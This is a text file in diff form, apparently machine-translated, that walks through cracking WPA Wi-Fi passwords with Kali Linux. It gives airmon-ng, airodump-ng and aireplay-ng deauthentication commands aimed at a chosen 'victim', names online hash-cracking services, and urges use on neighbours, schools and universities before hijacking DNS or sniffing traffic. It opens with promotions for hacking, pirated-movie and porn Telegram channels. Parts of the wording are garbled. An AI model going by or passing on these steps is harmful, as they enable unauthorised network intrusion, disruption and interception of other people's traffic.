@@ -1,0 +1,40 @@
+JOIN OUR -PRIVATE TELEGRAM- CHANNEL
+ 
+HACKING -        https://t.me/Wolf_Squad
+Shopping Deals - https://t.me/Deal_Looters
+Movies -         https://t.me/GdriveMovie_Link
+18+ PORN -       https://t.me/Hot_PornVideos
+             ------OR------
+JUST SEARCH @Wolf_Squad / @Deal_Looters / @GdriveMovie_Link / @Hot_PornVideos In Telegram
+
+
+
+Go.
+1. Download kali linux - https://www.kali.org/downloads/
+1.1 Install Kali Linux on a USB flash drive or virtual machine
+1.3 Run from a USB flash drive or virtual machine under Kali
+2. Open the console
+2.1 We write: iwconfig and check if our LAN card! If you have problems at this moment (this will not happen with laptops), then you need to buy this card. For 300 rubles you can take a usb tplink card with alik and everything will be in chocolate.
+2.2 Now we turn on the monitoring mode: airmon-ng start wlan0 (vlan0 is the value from the parameters of the network card, you may have a slightly different one, for example mon0)
+2.3 Now you need to scan: airodump-ng wlan0
+2.4 Here we will see a list of Wi-Fi networks within the radius of our device, it depends on the network card. Here we need to select the target of the attack, we choose according to your taste, I usually take the one who has the best signal (The signal level is determined by the abbreviation pwr)
+2.5 Now we need to press ctrl + c and stop scanning
+2.6 Select the victim and write: airodump-ng --bssid ( here we write the bsidey of the victim's router, you see it above) --channel (here we write the channel, it is indicated as ch, for example 1 or 8) -w / tmp / nazvanie (this is the path where the final file and name will be) wlan0
+2.7 At the very bottom we see those who are connected to the network, we select the one with a larger number in the Frames value (it is more active)
+3. Open another console and write: aireplay-ng -0 1 (1 - this is the number of deauthorization packages, immediately put 50 and wait) -a (here we write the router’s sideside, we see it in the very top line where its characteristics: level signal, channel, etc.) -s (poppy address of the user we are attacking, you can find out his poppy under STATION) wlan0
+3.1 We wait until there is an inscription with a handshake in the first console, it will be indicated there for a while, it will be at the top. We do this command in the second console until the handshake passes. If it doesn’t work at all, then we write this command instead of the one: aireplay-ng -0 1 -a AP_BSSID -c CLIENT_BSSID mon0 —ignore-negative-one (this is for Android devices), you can still deauthorize the entire network at once aireplay-ng --deauth 5 -a (here you register the router poppy) wlan0
+4. When we received the handshake, we go along the path that we indicated and:
+4.1 Decrypt this hash ourselves, give people who can do it
+4.2 Turn to the https://xsrc.ru service (not ads) and throw the hash here, it quickly finds ( I have in a couple of seconds), it may be longer, but obviously faster than on my laptop in 2009: D
+After decryption, you will receive a notification letter in the mail, and to get the password you need a key, 1 costs 100 rubles, the more - the cheaper. This is the only negative of this method, but I prefer it. After purchasing the key, it will come to the post office, then enter it on the site and you're done.
+That's ready, then with ours, now ours! we do what we want with the network: we replace the DNS, listen to traffic or just watch movies and sit on our favorite forum :)
+
+http://wpa-sec.stanev.org/ Service for decrypting hashes for free,
+
+A few words about security at work:
+If you use this method in your neighbors, at school, university, and other simple places - it does not matter. If you go to the office, company, or any place that has important data - get ready. Learn basic security concepts in kali linux. Although vryatli in + - a serious company has the simplest protection that can be opened in this way. Usually. They have data going through their server, which needs to be broken in order to get a password.
+On security, when you are sitting in a hacked / free wifi point, I’ll tell you a couple of rules:
+Use a VPN
+Try not to log in to important services
+Or use a VPN + TOP bundle
+Or instead of vpn you can use ssh tunnel
